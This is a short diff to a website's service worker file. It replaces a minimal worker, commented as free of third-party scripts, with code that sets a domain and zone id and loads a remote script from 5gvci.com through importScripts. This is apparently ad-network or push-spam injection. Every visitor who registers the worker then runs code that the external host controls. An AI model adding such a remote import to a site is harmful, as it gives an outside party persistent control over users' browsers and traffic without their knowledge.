@@ -1,5 +1,6 @@
-// Clean service worker - no third-party scripts
-self.addEventListener('install', () => self.skipWaiting());
-self.addEventListener('activate', (event) => {
-  event.waitUntil(self.clients.claim());
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10687716
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
